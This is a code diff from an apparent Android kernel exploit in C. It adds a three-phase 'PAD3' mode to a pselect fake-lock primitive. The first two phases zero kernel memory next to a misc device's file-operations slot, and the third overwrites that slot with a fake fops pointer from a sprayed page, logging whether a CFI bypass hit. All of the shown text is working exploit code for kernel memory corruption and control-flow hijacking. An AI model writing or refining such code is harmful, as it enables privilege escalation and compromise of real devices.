@@ -10,13 +10,18 @@ static double fops_elapsed_ms(struct timespec *ref) {
  * MODE4_CHAIN=1 (3 phases — legacy; phase1 MISC-16 parent softboots on CPH):
  *   1 ZERO_NAME / 2 ZERO_OWNER / 3 ION_SAFE
  *
- * MODE4_ZION=1 (2 phases — preferred research 2026-08-16):
- *   1 NAME0: only-left left=MISC-8 (name), parent_color=0 → *name=0
- *            (does NOT use MISC-16 as rb parent; bootid-style left-target write)
- *   2 ION:   lock=MISC-8 parent=1 right=fake_fops → *MISC=fake_fops if wait_lock=0
- * Why: MISC-as-parent/left-child softboots; zero name via *left=0 then root-erase.
+ * MODE4_ZION=1 (2 phases — name zero then ION; name left softboots on CPH):
+ *   1 NAME0 / 2 ION
+ *
+ * MODE4_PAD3=1 (3 phases — pad toxic neighbors then fops slot):
+ *   Theory: only-left links left as rb_node; walk of left+8/+16 softboots when
+ *   those hold kernel ptrs. Zero MISC+16 then MISC+8 first (parent_color=0),
+ *   then only-left left=MISC parent=fake_fops → *MISC=fake_fops with quiet kids.
+ *   1 PAD_HI: left=MISC+16, parent_color=0
+ *   2 PAD_MID: left=MISC+8,  parent_color=0
+ *   3 FOPS:    left=MISC,    parent=fake_fops
  */
-static int g_mode4_chain_phase; /* 0=off; CHAIN 1..3; ZION 1=name0 2=ion */
+static int g_mode4_chain_phase; /* 0=off; CHAIN 1..3; ZION 1..2; PAD3 1..3 */
 extern int pselect_custom_write;
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
@@ -153,6 +158,7 @@ void open_selected_fds(
                    env_flag("MODE4_ZERO_NAME", 0) ||
                    env_flag("MODE4_CHAIN", 0) ||
                    env_flag("MODE4_ZION", 0) ||
+                   env_flag("MODE4_PAD3", 0) ||
                    env_flag("MODE4_FOPS_SLOT", 0) ||
                    env_flag("MODE4_KIMAGE_MISC", 0) ||
                    env_flag("MODE4_P0_MISC", 0) ||
@@ -482,6 +488,46 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           pr_info("stack mode4 ZION_ION lock=MISC-8=%016llx parent=1 "
                   "right=fake_fops prio=200 (*MISC if wait_lock cleared)\n",
                   (unsigned long long)stack_lock);
+        } else if (env_flag("MODE4_PAD3", 0) && g_mode4_chain_phase == 1) {
+          /* Zero MISC+16 first (highest neighbor of fops slot as rb_node). */
+          tree_pc = 0;
+          tree_r = 0;
+          tree_l = misc + 16;
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = 0;
+          stack_lock = fake_lock;
+          stack_prio = 3;
+          stack_deadline = 0;
+          pr_info("stack mode4 PAD3_1 only-left parent_color=0 left=MISC+16=%016llx "
+                  "(*pad=0)\n",
+                  (unsigned long long)(misc + 16));
+        } else if (env_flag("MODE4_PAD3", 0) && g_mode4_chain_phase == 2) {
+          tree_pc = 0;
+          tree_r = 0;
+          tree_l = misc + 8;
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = 0;
+          stack_lock = fake_lock;
+          stack_prio = 3;
+          stack_deadline = 0;
+          pr_info("stack mode4 PAD3_2 only-left parent_color=0 left=MISC+8=%016llx "
+                  "(*pad=0)\n",
+                  (unsigned long long)(misc + 8));
+        } else if (env_flag("MODE4_PAD3", 0) && g_mode4_chain_phase == 3) {
+          tree_pc = (uint64_t)fake_fops;
+          tree_r = 0;
+          tree_l = misc;
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = 0;
+          stack_lock = fake_lock;
+          stack_prio = 3;
+          stack_deadline = 0;
+          pr_info("stack mode4 PAD3_3 only-left parent=fake_fops left=MISC=%016llx "
+                  "(*MISC=fake_fops after pads)\n",
+                  (unsigned long long)misc);
         } else if (env_flag("MODE4_FOPS_SLOT", 0)) {
           /*
            * Patch ashmem_fops.write slot (usually 0) via only-left.
@@ -925,22 +971,26 @@ void do_pselect_fake_lock_route(void) {
   int route_verified = 0;
   int chain = env_flag("MODE4_CHAIN", 0);
   int zion = env_flag("MODE4_ZION", 0);
-  int max_att = zion ? 2 : (chain ? 3 : PSELECT_CFI_ROUTE_ATTEMPTS);
-  if (zion)
+  int pad3 = env_flag("MODE4_PAD3", 0);
+  int max_att = pad3 ? 3 : (zion ? 2 : (chain ? 3 : PSELECT_CFI_ROUTE_ATTEMPTS));
+  if (pad3)
+    pr_info("MODE4_PAD3=1: phase1 MISC+16=0, phase2 MISC+8=0, "
+            "phase3 *MISC=fake_fops (pad toxic rb neighbors)\n");
+  else if (zion)
     pr_info("MODE4_ZION=1: phase1 NAME0 only-left *name=0, phase2 ION_SAFE "
             "(live_sync; no MISC-16 parent)\n");
   else if (chain)
     pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
             "phase3 ION_SAFE (same process; rb-leaf fops)\n");
   for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
-    if (zion || chain)
+    if (pad3 || zion || chain)
       g_mode4_chain_phase = route_attempt;
     else
       g_mode4_chain_phase = 0;
     if (route_attempt != 1) {
       /* CHAIN phase2/3: reuse spray so fake_fops leaf stays; zeros are in kernel. */
       int reuse_page =
-          (chain || zion) && route_attempt >= 2 && page_base && fake_fops;
+          (chain || zion || pad3) && route_attempt >= 2 && page_base && fake_fops;
       if (!reuse_page) {
         page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
         if (!page_base || !fake_lock || !fake_fops) {
@@ -953,8 +1003,9 @@ void do_pselect_fake_lock_route(void) {
         }
       } else {
         pr_info("MODE4_%s reuse FOPS page phase=%d\n",
-                zion ? "ZION" : "CHAIN", g_mode4_chain_phase);
-        durable_proof_log(zion ? "zion_reuse_page" : "chain_reuse_page");
+                pad3 ? "PAD3" : (zion ? "ZION" : "CHAIN"), g_mode4_chain_phase);
+        durable_proof_log(pad3 ? "pad3_reuse_page"
+                               : (zion ? "zion_reuse_page" : "chain_reuse_page"));
       }
     }
 
@@ -1146,14 +1197,42 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (chain || zion) {
+    if (chain || zion || pad3) {
       char cbuf[160];
+      const char *tag = pad3 ? "PAD3" : (zion ? "ZION" : "CHAIN");
       snprintf(cbuf, sizeof(cbuf),
                "%s_phase=%d success=%d calls=%d cfi_step=%d cfi_errno=%d "
                "cfi_wr=%zd",
-               zion ? "ZION" : "CHAIN", route_attempt, success, calls,
-               cfi_last_step, cfi_last_errno, cfi_write_ret);
-      live_sync_log(zion ? "ZION" : "CHAIN", cbuf);
+               tag, route_attempt, success, calls, cfi_last_step, cfi_last_errno,
+               cfi_write_ret);
+      live_sync_log(tag, cbuf);
+    }
+    if (pad3 && route_attempt == 1 && success > 0) {
+      live_sync_log("PAD3", "phase1_MISC_p16_ok");
+      continue;
+    }
+    if (pad3 && route_attempt == 1 && success <= 0) {
+      live_sync_log("PAD3", "phase1_FAIL_stop");
+      pr_warning("MODE4_PAD3 phase1 fail — stop\n");
+      break;
+    }
+    if (pad3 && route_attempt == 2 && success > 0) {
+      live_sync_log("PAD3", "phase2_MISC_p8_ok_next_FOPS");
+      continue;
+    }
+    if (pad3 && route_attempt == 2 && success <= 0) {
+      live_sync_log("PAD3", "phase2_FAIL_stop");
+      pr_warning("MODE4_PAD3 phase2 fail — stop\n");
+      break;
+    }
+    if (pad3 && route_attempt == 3) {
+      char ibuf[128];
+      snprintf(ibuf, sizeof(ibuf),
+               "phase3_FOPS success=%d cfi_step=%d cfi_errno=%d wr=%zd",
+               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
+      live_sync_log("PAD3", ibuf);
+      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
+        live_sync_log("PAD3", "FOPS_CFI_HIT");
     }
     if (zion && route_attempt == 1 && success > 0) {
       durable_proof_log("zion_name0_done");
